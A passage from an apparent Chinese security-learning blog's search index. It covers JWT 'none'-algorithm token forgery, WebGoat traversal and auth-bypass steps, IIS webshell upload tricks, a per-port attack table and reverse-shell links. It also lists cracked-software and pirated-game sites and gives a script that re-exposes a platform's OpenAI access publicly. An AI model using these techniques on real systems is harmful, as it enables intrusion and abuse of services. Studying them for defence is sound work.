amp;身份验证&amp;逻辑&amp;JWT3、访问控制&amp;安全组件&amp;越权&amp;三方组件 JWT认证 json_web_token 12345678JWT：https://www.cnblogs.com/vege/p/14468030.html三部分构成，以.分隔，出现在cookie上。eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c对比cookie解密平台：https://jwt.io/ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c 1切换账号，抓包发现： 123cookie：eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2NDMxOTk5MzYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.C_2nlYK5_bhv5RHnRbPW7sxIkZsaPN-AYX3xBwo3n5PeIzdK7G1-sjJjo8qIaH_JHZVaR7amGQTdNiEjYAkAMg 解密后： 12345攻击：1.空加密算法 2.爆破 3.KID1.空加密算法：生成字符串：算法模式+秘钥（缺一不可）忽略秘钥生成，需要服务器支持不要秘钥签名（空模式加密）抓到数据包 12345找到相对应的代码段发现可以空加密然后用python脚本去写空加密jwteyJhbGciOiJub25lIn0.eyJpYXQiOjE1NzM0NzAwMjUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9. 2.爆破： JavaWeb-WebGoat8靶场搭建使用 123456• https://blog.csdn.net/Petrichoryi/article/details/105930751• 压缩到jar包里面。• 如何启动：安装jdk，运行java.exe -jar webgoat --server.port= 9091• • java -jar webgoat-server-8.1.0.jar --server.port=8091访问ip+WebGoat/login.html，注册账号登录就可以了。 安全问题-目录遍历&amp;身份认证-JWT攻击 123目录遍历：解决问题：当前目录不能执行，上传至别的目录进行执行脚本上传上去的地址： 1目标地址： 1抓取上传数据包： 1找到相对应触发的代码段： 1234567关键代码：publicAttackResultuploadFileHandler(@RequestParam(&quot;uploadedFile&quot;)MultipartFilefile,@RequestParam(value=&quot;fullName&quot;,required=false)StringfullName)&#123;returnsuper.execute(file,fullName);&#125; 接受uploadedfile对应抓包： 1把test修改为1后，发现返回数据包： 1把fullname修改为： 12成功过关。第三关，用同样的方式没有用了，打开相对应的代码，发现关键的过滤： 12但是这个过滤知识一次性的，并不是很严格。双写绕过： 1解决问题：当前上传的文件所在的文件夹不解析。 12345678910111213身份认证：认证问题答案，很多选项：你叫什么名字等等.....只有两个问题 接受键名和键值s0=xiaodi&amp;s1=湖北 正确s3=null&amp;s4=null发送数据s3 s4为空，相当于NULL，那么就能进行绕过。安全验证：固定接受的数据：s0 s1判断你的数据 正常不固定：s0 s1 正常不固定：s2 s3不在数据库或者变量内，攻击者就能测试。URL触发连接，访问地址：auth-bypass/verify-account 1找到对应的代码段","categories":[],"tags":[{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"}]},{"title":"[转载]基础加密","slug":"转载-基础加密","date":"2024-10-02T14:09:25.000Z","updated":"2024-10-02T14:16:05.803Z","comments":true,"path":"2024/10/02/转载-基础加密/","permalink":"http://example.com/2024/10/02/%E8%BD%AC%E8%BD%BD-%E5%9F%BA%E7%A1%80%E5%8A%A0%E5%AF%86/","excerpt":"","text":"基础入门-加密编码算法 前言：在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。 #常见加密编码等算法解析MD5， SHA， ASC，进制，时间戳， URL， BASE64， Unescape， AES， DES 等 #常见加密形式算法解析直接加密， 带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等 #常见解密方式（针对）枚举，自定义逆向算法，可逆向 #了解常规加密算法的特性长度位数，字符规律，代码分析，搜索获取等 md5全称是md5信息摘要算法（英文：MD5 Message-Digest Algorithm ），一种被广泛使用的密码散列函数，可以产生一个128位（16字节，1字节8位）的散列值（常见的是用32位的16进制表示，比如：0caa3b23b8da53f9e4e041d95dc8fa2c），用于确保信息传输的完整一致。md5特性不可逆具有高度的离散性压缩性（任意长度的数据，算出的md5值得长度都是固定的）弱碰撞性（现在网上有很多彩虹表，挺容易碰撞的）几种哈希算法比较： md5——–32位的16进制表示sha1——-40位的16进制表示sha256—–64位的16进制表示sm3——–64位的16进制表示 URL 编码（百分比编码）URL 编码将字符转换为可通过因特网传输的格式。URL 只能使用 ASCII 字符集 通过因特网进行发送。由于 URL 通常包含 ASCII 集之外的字符，因此必须将 URL 转换为有效的 ASCII 格式。URL 编码使用后跟十六进制数字的 “%” 替代不安全的 ASCII 字符。URL 不能包含空格。URL 编码通常使用加号（+）或 %20 替代空格。 base64编码Base64编码就是使用64个字符作为一个基本字符集：小写字母a-z、大写字母A-Z、数字0-9、符号”+”、”&#x2F;“（再加上作为垫字的”&#x3D;”，实际上是65个字符）。然后，所有其他符号都根据一定规则转换成这个字符集中的字符。Base64 编码是用64（2的6次方）个特定的ASCII字符来表示256（2的8次方）个ASCII字符，也就是说三个ASCII字符经过Base64编码后变为四个的ASCII字符显示（公约数为24），编码后数据长度比原来增加1&#x2F;3，不足3n用“&#x3D;”补足。 2、演示案例1.某 CTF 比赛题目解析-脚本自定义算法组合逆向打开bugku，找到 给的数据为 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA&#x3D; 加密算法如下 大概读了一下是用一个MD5后ISCC为密钥，对密钥重复扩展到待加密数据的长度，然后对它们的每个字节进行了密钥与明文的acill的数字值相加后对128取余，再恢复成字符串，然后进行base64编码，题目中给出的一串字符串明显用了base64编码，所以我们反向推出data 或者 Flag:{asdqwdfasfdawfefqwdqwdadwqadawd} 2.某 CMS 密码加密解密-MD5+salt某CMS密码是加盐md5，如下图所示，找到盐值 直接解密，无法成功 加盐解密，成功，但是需要付费 付费后 成功查到结果 3.某 URL 加密地址的漏洞测试-AES+Base64+自定义 打开墨者学院-sql注入漏洞测试（参数加密） 进入靶场 点击通知 扫描地址，找到一个目录 打开，泄露备份文件 下载，解压，查看源码 分析 了解了加解密过程，接下来注入即可。 参考：https://blog.csdn.net/qq_36585338/article/details/128057663 4.某实际应用 URL 地址参数加密-搜索特定关键字加密字符串谷歌搜索url中带有id&#x3D;1（1进行base64编码）的url，可以看看 inurl:id&#x3D;MQ&#x3D;&#x3D; 3、涉及资源https://tool.lu/timestamp/ 在线时间戳转换http://tool.chacuo.net/cryptaes 在线AES加密解密https://www.cmd5.com/ MD5在线解密","categories":[],"tags":[{"name":"加密编码算法","slug":"加密编码算法","permalink":"http://example.com/tags/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"}]},{"title":"web攻防_小迪安全学习","slug":"web攻防-小迪安全学习","date":"2024-10-02T04:44:20.000Z","updated":"2024-10-02T10:46:41.164Z","comments":true,"path":"2024/10/02/web攻防-小迪安全学习/","permalink":"http://example.com/2024/10/02/web%E6%94%BB%E9%98%B2-%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"web攻防_asp研究方向:WEB源码,开发语言,中间件平台,数据库类型,插件第三方软件windows,iis, asp, access sqlserver iis6.0中间件漏洞(Microsoft-IIS6.0)1.access 数据库一般后缀名 asp,asa,mdb(下载)mdb文件一般在网址目录下 思路:根据数据库的地址,尝试下载数据库文件,获取当前管理员密码信息 默认数据库配置路径1.本地搭建源码2.扫描路径数据存放在asp中,可以对网站写入一句话木马文件,然后访问asp直接上线 2.iis目录扫描 短文件名探针iis_shortname3.iis6.0解析漏洞,配合上传漏洞123上传图片马,配合解析漏洞目录名 a.asp;. ,目录下有一个图片马 上传后的文件名为 a.asp.xxxxjpg 4.iis putweb服务拓展勾选了写入权限 put 一句话到txt ,move到 shell.asp或者是 xxx,asp.txt配合解析漏洞 .net安全问题 aspx特性漏洞windows + iis + aspx +sqlserver 1.路径泄露 2.反编译dll 3.未授权访问 dll文件反编译指向(使用ILspy查看源码)bin目录下多可执行文件 信息泄露web.config中的设置 泄露路径等信息 未授权访问判断用户的身份: 由于后台多个功能文件页面 每个文件里面添加判断代码 创建一个文件专门用来判断,其他文件进行调用 找未授权访问: ​ 1.找那些文件未包含验证代码的 ​ 2.验证代码文件有没有可以绕过","categories":[],"tags":[{"name":"web攻防,asp","slug":"web攻防-asp","permalink":"http://example.com/tags/web%E6%94%BB%E9%98%B2-asp/"}]},{"title":"安卓逆向学习笔记","slug":"安卓逆向学习笔记","date":"2024-08-09T06:14:32.000Z","updated":"2024-08-09T08:11:46.947Z","comments":true,"path":"2024/08/09/安卓逆向学习笔记/","permalink":"http://example.com/2024/08/09/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"52pj安卓逆向学习笔记1.apk结构apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。 文件 注释 assets目录 存放APK的静态资源文件，比如视频，音频，图片等 lib 目录 armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件 META-INF目录 保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改) res目录 res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计 AndroidMainfest.xml文件 APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息 classes.dex文件 classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑 resources.arsc文件 resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源 2.双开及原理双开：简单来说，就是手机同时运行两个或多个相同的应用，例如同时运行两个微信 原理 解释 修改包名 让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP 修改Framework 对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开 通过虚拟化技术实现 虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间 以插件机制运行 利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp 3.汉化APK汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化 基本上字符串都是在arsc里，建议一键汉化，然后再润色。少量没汉化到的字符串参考视频中的方法定位去逐个汉化。 流程图这里还需要注意的是，如果要直装应用，那就应该先签名安装，看看是否有签名校验导致的闪退 4.初识AndroidManifest.xmlAndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidManifest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。 属性 定义 versionCode 版本号，主要用来更新，例如:12 versionName 版本名，给用户看的，例如:1.2 package 包名，例如：com.zj.52pj.demo uses-permission android:name&#x3D;”” 应用权限，例如：android.permission.INTERNET 代表网络权限 android:label&#x3D;”@string&#x2F;app_name” 应用名称 android:icon&#x3D;”@mipmap&#x2F;ic_launcher” 应用图标路径 android:debuggable&#x3D;”true” 应用是否开启debug权限 5.什么是JVM、Dalvik、ARTJVM是JAVA虚拟机，运行JAVA字节码程序Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异 6.smali及其语法smali是Dalvik的寄存器语言，smali代码是dex反编译而来的。 关键字 名称 注释 .class 类名 .super 父类名，继承的上级类名名称 .source 源名 .field 变量 .method 方法名 .register 寄存器 .end method 方法名的结束 public 公有 protected 半公开，只有同一家人才能用 private 私有，只能自己使用 .parameter 方法参数 .prologue 方法开始 .line xxx 位于第xxx行 数据类型对应 smali类型 java类型 注释 V void 无返回值 Z boolean 布尔值类型，返回0或1 B byte 字节类型，返回字节 S short 短整数类型，返回数字 C char 字符类型，返回字符 I int 整数类型，返回数字 J long （64位 需要2个寄存器存储） 长整数类型，返回数字 F float 单浮点类型，返回数字 D double （64位 需要2个寄存器存储） 双浮点类型，返回数字 string String 文本类型，返回字符串 Lxxx&#x2F;xxx&#x2F;xxx object 对象类型，返回对象 常用指令 关键字 注释 const 重写整数属性，真假属性内容，只能是数字类型 const-string 重写字符串内容 const-wide 重写长整数类型，多用于修改到期时间。 return 返回指令 if-eq 全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳 if-ne 全称not equal(a!&#x3D;b)，ab内容不相同则跳 if-eqz 全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳 if-nez 全称not equal zero(a!&#x3D;0)，a不等于0则跳 if-ge 全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳 if-le 全称little equal(a&lt;&#x3D;b)，a小于或等于则跳 goto 强制跳到指定位置 switch 分支跳转，一般会有多个分支线，并根据指令跳转到适当位置 iget 获取寄存器数据 其余指令可用语法工具查询 定位方法：搜索弹窗关键字、抓取按钮id","categories":[],"tags":[{"name":"安卓逆向","slug":"安卓逆向","permalink":"http://example.com/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"}]},{"title":"Mac破解软件网站","slug":"Mac破解软件网站","date":"2024-08-06T07:25:07.000Z","updated":"2024-08-06T07:26:51.856Z","comments":true,"path":"2024/08/06/Mac破解软件网站/","permalink":"http://example.com/2024/08/06/Mac%E7%A0%B4%E8%A7%A3%E8%BD%AF%E4%BB%B6%E7%BD%91%E7%AB%99/","excerpt":"","text":"macwk 1.6k 第一个当属 macwk，经历过闭站后浴火重生，现在资源还比较少，但是质量都很高。网站无需登录也没有登录。基本上提供夸克云盘下载 佛系软件 896 资源很多，大部分来自 TNT team。下载无需登录，提供百度云盘和夸克云盘下载 macked 810 资源很多，也有原创一手破解。无需登录，提供 123 云盘和百度网盘下载。登录网站可以直链下载，速度挺快，并且有问题在评论留言站长也会回复，非常不错 xmac 651 资源很多，大部分来自 TNT team。无需登录，提供直链和 IPFS 下载 appstorrent 539 俄罗斯的网站，资源很多，更新也很快。无需登录，直链下载。有些热门软件会受版权影响则不提供下载，但是可以去其他地方找~ macserialjunkie 394 国外的论坛，时常会有一手破解资源。非常不错，可以作为兜底去逛逛。上面这些网站有些可能得挂梯子才能访问，还有一些更新速度慢，吃相难看的网站就不分享了~ https://www.minorpatch.com/ https://macapp.org.cn/ https://www.macvk.com https://xclient.info/","categories":[],"tags":[{"name":"MAC收藏","slug":"MAC收藏","permalink":"http://example.com/tags/MAC%E6%94%B6%E8%97%8F/"}]},{"title":"看图识别waf","slug":"看图识别waf","date":"2024-07-19T02:54:22.000Z","updated":"2024-07-19T02:55:07.135Z","comments":true,"path":"2024/07/19/看图识别waf/","permalink":"http://example.com/2024/07/19/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%88%ABwaf/","excerpt":"","text":"本文转载自微信公众号：潇湘信安。已获得原作者授权，转载请注明出处 原文链接：https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ 前言去年年底看到@madcoding老哥博客的“waf的识别与绕过”一文中搜集了不少WAF拦截页面，正好我平时也有搜集WAF拦截页面的习惯，所以结合他的一起整理成了这么一篇文章，便于自己日后遇到WAF时好查询，并进行针对性的绕过测试！！！ 现如今WAF种类繁多，笔者搜集的可能也并不是那么齐全和准确，还望得到各位老哥的补充和修正！！！ (1) D盾 (2) 云锁 (3) UPUPW安全防护 (4) 宝塔网站防火墙 (5) 网防G01 (6) 护卫神 (7) 网站安全狗 (8) 智创防火墙 (9) 360主机卫士或360webscan (10) 西数WTS-WAF (11) Naxsi WAF (12) 腾讯云 (13) 腾讯宙斯盾 (14) 百度云 (15) 华为云 (16) 网宿云 (17) 创宇盾 (18) 玄武盾 (19) 阿里云盾 (20) 360网站卫士 (21) 奇安信网站卫士 (22) 安域云WAF (23) 铱讯WAF (24) 长亭SafeLine (25) 安恒明御WAF (26) F5 BIG-IP (27) Mod_Security (28) OpenRASP (29) dotDefender (30) 未知云WAF 参考链接https://www.mad-coding.cn/2019/12/19/waf的识别与绕过（不断补充）","categories":[],"tags":[{"name":"waf","slug":"waf","permalink":"http://example.com/tags/waf/"}]},{"title":"网络安全","slug":"沉淀自己-网络安全","date":"2024-07-17T07:18:01.000Z","updated":"2024-10-02T04:45:27.533Z","comments":true,"path":"2024/07/17/沉淀自己-网络安全/","permalink":"http://example.com/2024/07/17/%E6%B2%89%E6%B7%80%E8%87%AA%E5%B7%B1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/","excerpt":"","text":"反弹shellhttps://forum.ywhack.com/reverse-shell/ 工具库https://forum.ywhack.com/bountytips.php?downloa 下载命令生成https://github.com/r0eXpeR/File-Download-Generator.git 123文件上传下载-解决无图形化&amp;解决数据传输 Linux：wget curl python ruby perl java 等 Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等 nc 参数 说明 -n 直接使用IP地址 -p &lt;通信端口&gt;，设置本地主机使用的通信端口 -u 使用UDP传输协议 -v 显示指令执行过程。 -w &lt;超时秒数&gt;，设置等待连线的时间。 -z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用。 -k 永久占用某端口。RHEL7 or later只支持TCP端口的永久占用。 -l 使用监听模式，管理传入的信息 -e 将传入的信息以命令执行 netstat 命令介绍netstat 网络连接状态查看命令，可以查看的网络中的传输层（TCP、UDP）信息 命令参数： -a 或 --all：显示所有网络连接（包括监听和非监听的）和监听端口 -t 或 --tcp：仅显示TCP连接 -u 或 --udp：仅显示UDP连接 -n 或 --numeric：显示IP地址和端口号，而不是进行域名解析和端口服务名称解析 -r 或 --route：显示路由表 -l 或 --listening：显示监听中的套接字（等待连接的端口） -p（在某些系统中需要）：显示与每个连接或监听端口相关的进程ID和进程名称 -s 或 --statistics：显示每个协议的统计信息 -i 或 --interfaces：显示网络接口的信息，包括收发数据包的统计 -c 或 --continuous：持续列出网络状态，可以配合 -w（刷新时间间隔）使用 -b（在Windows中）：显示正在创建网络连接或监听端口的可执行文件的路径 “pikachu” &amp;&amp; country&#x3D;”CN” &amp;&amp; title&#x3D;&#x3D;”Get the pikachu” https://telegraph-image-6fs.pages.dev/file/5aa1aa617172eb721e535.jpg http状态码123456200 正常3xx重定向 跳转 处置过程 判断可有可无4xx不存在 文件夹403存在 404不存在 文件200存在 404不存在5xx服务器错误 信息收集文件共享服务端口： 端口号 端口说明 攻击方向 21&#x2F;22&#x2F;69 FTP&#x2F;TFTP文件传输协议 允许匿名的上传、下载、爆破和嗅探操作 2049 Nfs服务 配置不当 139 Samba服务 爆破、未授权访问、远程代码执行 389 Ldap目录访问协议 注入、允许匿名访问、弱口令 远程连接服务端口： 端口号 端口说明 攻击方向 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Rdp远程桌面连接 Shift后门（需要Windows Server 2003以下的系统）、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere服务 抓密码、代码执行 Web应用服务端口： 端口号 端口说明 攻击方向 80&#x2F;443&#x2F;8080 常见的Web服务端口 Web攻击、爆破、对应服务器版本漏洞 7001&#x2F;7002 WebLogic控制台 Java反序列化、弱口令 8080&#x2F;8089 Jboss&#x2F;Resin&#x2F;Jetty&#x2F;Jenkins 反序列化、控制台弱口令 9090 WebSphere控制台 Java反序列化、弱口令 4848 GlassFish控制台 弱口令 1352 Lotus domimo邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 数据库服务端口： 端口号 端口说明 攻击方向 3306 MySQL 注入、提权、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹shell 5432 PostgreSQL数据库 爆破、注入、弱口令 27017&#x2F;27018&#x2F;27019&#x2F;28017 MongoDB 爆破、未授权访问 6379 Redis数据库 可尝试未授权访问、弱口令爆破 5000 SysBase&#x2F;DB2数据库 爆破、注入 邮件服务端口： 端口号 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3服务 爆破、嗅探 143 IMAP协议 爆破 网络常见协议端口： 端口号 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67&#x2F;68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、搜集目标内网信息 特殊服务端口： 端口号 端口说明 攻击方向 2181 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200&#x2F;9300 Elasticsearch服务 远程执行 11211 Memcache服务 未授权访问 512&#x2F;513&#x2F;514 Linux Rexec服务 爆破、Rlogin登录 873 Rsync服务 匿名访问、文件上传 3690 Svn服务 Svn泄露、未授权访问 50000 SAP Management Console 远程执行 cdn超级 Ping：https://www.17ce.com/ 接口查询：https://get-site-ip.com/ 国外请求：https://tools.ipip.net/cdn.php 全网扫描：https://github.com/Tai7sy/fuckcdn","categories":[],"tags":[{"name":"网络安全学习","slug":"网络安全学习","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"安卓termux部署docker","slug":"安卓termux部署docker","date":"2024-07-16T05:00:21.000Z","updated":"2024-07-16T07:12:15.542Z","comments":true,"path":"2024/07/16/安卓termux部署docker/","permalink":"http://example.com/2024/07/16/%E5%AE%89%E5%8D%93termux%E9%83%A8%E7%BD%B2docker/","excerpt":"","text":"alpine-term开箱即用 下载安装APP并登录root（地址Github：https://github.com/FakeRajbhx/alpine-term/）首先先下载alpine-term 578 MB下载安装和安装后初始化开机都需要等一会儿，大约一分钟 开机后，登录系统，用户 alpine 密码: alpine然后切换到root账户，输入sudo -s 密码：alpine如果想要修改root密码， 输入 passwd ，需要输入两次新密码。 开启root登录SSH注意：请不要将app放在后台去复制以下代码，不然切换回来需要重新启动系统默认是禁止ssh密码登录的，所以需要先开启她，输入： 1sed -i &#x27;s/PasswordAuthentication no/PasswordAuthentication yes/g&#x27; /etc/ssh/sshd_config 如果还需要开机root用户登录的话，输入 1sed -i &#x27;s/PermitRootLogin no/PermitRootLogin yes/g&#x27; /etc/ssh/sshd_config 然后重启启动sshd服务，输入 1service sshd restart 重启完成就配置好了。 添加开机启动 rc-update add sshd boot 映射ssh的22端口因为是Qemu套娃，所以需要映射ssh的22端口，开机完成后，会出现菜单。 然后映射ssh的22端口到手机的2222端口，选择 [1]QEMU，输入 1hostfwd_add tcp::10022-:22 回车 【注意】这个映射端口的命令每次重启Alpine Term 都需要重新设置一次！建议常驻后台，常驻后台内存占用和耗电量都很低。 执行上面的指令后就可以远程ssh手机的2222端口。接下来的操作也强烈建议在电脑上远程ssh操作，毕竟Ctrl C V特别方便。 配置APK源和DNS -1&#x2F;etc&#x2F;apk&#x2F;repositorieshttps://mirrors.aliyun.com/alpine/v3.6/main/@testing https://mirrors.aliyun.com/alpine/edge/testinghttps://mirrors.aliyun.com/alpine/v3.6/community/ 配置DNS修改&#x2F;etc&#x2F;resolv.conf文件：nameserver 114.114.114.114nameserver 114.114.115.115 配置APK源和DNS -2因为Alpine默认的都是国外的源和DNS，所以这里都需要改成国内的更换阿里云的源 1sed -i &#x27;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#x27; /etc/apk/repositories 更换阿里云+DNSPOD 的DNS 12sed -i &#x27;s/nameserver 185.120.22.15/nameserver 114.114.114.114/g&#x27; /etc/resolv.confsed -i &#x27;s/nameserver 94.16.114.254/nameserver 114.114.115.115/g&#x27; /etc/resolv.conf 这样网络就正常可以使用了，接下来设置时区 1setup-timezone 等到提示Which timezone are you in? (&#39;?&#39; for list) [UTC]，然后输入Asia/Shanghai执行完成后，输入date测试下时间。 更新软件包，启动Docker12apk updateapk upgrade 更新之后设置docker开机启动 1rc-update add docker 然后启动docker 123456service docker start#后台启动setsid containerdsetsid dockerd测试 docker info 启动的挺慢，稍等一分钟左右，然后试试docker version，打印版本号则启动成功。 Docker内容器端口映射需要在QEMU中输入 hostfwd_add tcp::安卓手机端口-:容器端口 (同理映射ssh的22端口) docker修改镜像源找到 &#x2F;etc&#x2F;docker&#x2F;daemon.json文件，没有该文件就新建一个可以多加几个国内源，比如： Docker 官方中国区：https://registry.docker-cn.com； 网易：http://hub-mirror.c.163.com； 中国科技大学：https://docker.mirrors.ustc.edu.c {“registry-mirrors”: [“https://tuizwb58.mirror.aliyuncs.com”,“https://registry.docker-cn.com”,“http://hub-mirror.c.163.com”]} 重启docker： service docker restart 拉取青龙镜像docker pull whyour&#x2F;qinglong 创建青龙 123456789docker run -dit \\-v $PWD/ql/config:/ql/config \\-v $PWD/ql/log:/ql/log \\-v $PWD/ql/db:/ql/db \\-p 5600:5600 \\--name qinglong \\--hostname qinglong \\--restart always \\whyour/qinglong:latest 最后就是装完青龙也需要映射端口： [2]&#x2F;dev&#x2F;ttyS0输入：ssh &#x72;&#111;&#111;&#116;&#64;&#x31;&#50;&#55;&#46;&#x30;&#46;&#48;&#x2e;&#x31; -p 5600 手指在软件的左上方向右滑，会出现菜单选择 [1]QEMU，输入 hostfwd_add tcp::5600-:5600 hostfwd_add tcp::安卓手机端口-:容器端口 (同理映射ssh的22端口) hostfwd_add tcp::5678-:5678","categories":[],"tags":[{"name":"安卓,docker,termux","slug":"安卓-docker-termux","permalink":"http://example.com/tags/%E5%AE%89%E5%8D%93-docker-termux/"}]},{"title":"免费搭建GPT4","slug":"免费搭建GPT4","date":"2024-06-28T06:27:06.000Z","updated":"2024-06-28T06:36:34.747Z","comments":true,"path":"2024/06/28/免费搭建GPT4/","permalink":"http://example.com/2024/06/28/%E5%85%8D%E8%B4%B9%E6%90%AD%E5%BB%BAGPT4/","excerpt":"","text":"免费搭建GPT41.首先,前往 https://www.val.town/ 注册一个账号,然后新建一个HTTP窗口。 2.接着,将我提供的代码粘贴到窗口中: 这段代码利用了Val Town平台和OpenAI的SDK,可以让我们轻松调用GPT4 API。你不用太关心具体实现,照着粘贴就行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import &#123; OpenAI &#125; from &quot;https://esm.town/v/std/openai&quot;;export default async function(req: Request): Promise&lt;Response&gt; &#123; if (req.method === &quot;OPTIONS&quot;) &#123; return new Response(null, &#123; headers: &#123; &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;, &quot;Access-Control-Allow-Headers&quot;: &quot;*&quot;, &#125;, status: 204, &#125;); &#125; const openai = new OpenAI(); try &#123; var body = await req.json(); &#125; catch (e) &#123; var search = (new URL(req.url)).searchParams; body = &#123; &quot;messages&quot;: [&#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: search.get(&quot;q&quot;) || &quot;hello&quot; &#125;], &quot;temperature&quot;: 0.5, &quot;presence_penalty&quot;: 0, &quot;frequency_penalty&quot;: 0, &quot;top_p&quot;: 1, stream: true, model: &quot;gpt-4-turbo&quot;, &#125;; &#125; const stream = await openai.chat.completions.create(body); if (!body.stream) &#123; return new Response(JSON.stringify(body), &#123; headers: &#123; &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;, &quot;Access-Control-Allow-Headers&quot;: &quot;*&quot;, &quot;Content-Type&quot;: &quot;application/json; charset=UTF-8&quot;, &#125;, &#125;); &#125; /* const &#123; readable, writable &#125; = new TransformStream(); const my_stream_writer = writable.getWriter(); var encoder = new TextEncoder(); (async () =&gt; &#123; for await (const chunk of stream) &#123; my_stream_writer.write(encoder.encode(chunk.choices[0]?.delta?.content || &quot;&quot;)); &#125; my_stream_writer.close(); &#125;)();*/ const &#123; readable, writable &#125; = new TransformStream(); const my_stream_writer = writable.getWriter(); var reader = stream.toReadableStream().getReader(); var totalText = &quot;&quot;; const decoder = new TextDecoder(&quot;utf-8&quot;, &#123; stream: true &#125;); var encoder = new TextEncoder(); (async () =&gt; &#123; while (true) &#123; const &#123; done, value &#125; = await reader.read(); if (done) break; totalText += decoder.decode(value, &#123; stream: true &#125;); var msgs = totalText.split(&quot;\\n&quot;); totalText = msgs.pop(); for (let i in msgs) &#123; my_stream_writer.write(encoder.encode(`data: $&#123;msgs[i]&#125;\\n\\n`)); &#125; await new Promise((r) =&gt; &#123; setTimeout(r, 20); &#125;); &#125; my_stream_writer.close(); &#125;)(); return new Response(readable, &#123; headers: &#123; &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;, &quot;Access-Control-Allow-Headers&quot;: &quot;*&quot;, &quot;Content-Type&quot;: &quot;text/event-stream; charset=UTF-8&quot;, &#125;, &#125;);&#125; 粘贴完代码后,点击Preview按钮,如果没有报错,恭喜你就成功了!😄 复制生成的URL,这就是你的GPT4 API地址。","categories":[],"tags":[{"name":"gpt4","slug":"gpt4","permalink":"http://example.com/tags/gpt4/"}]},{"title":"收藏集合","slug":"收藏集合","date":"2024-06-28T06:07:16.000Z","updated":"2024-06-28T06:07:32.021Z","comments":true,"path":"2024/06/28/收藏集合/","permalink":"http://example.com/2024/06/28/%E6%94%B6%E8%97%8F%E9%9B%86%E5%90%88/","excerpt":"","text":"网站 子下载: https://www.gamestorrents.fm/ 游侠网单机游戏: https://www.ali213.net/ Switch游戏: 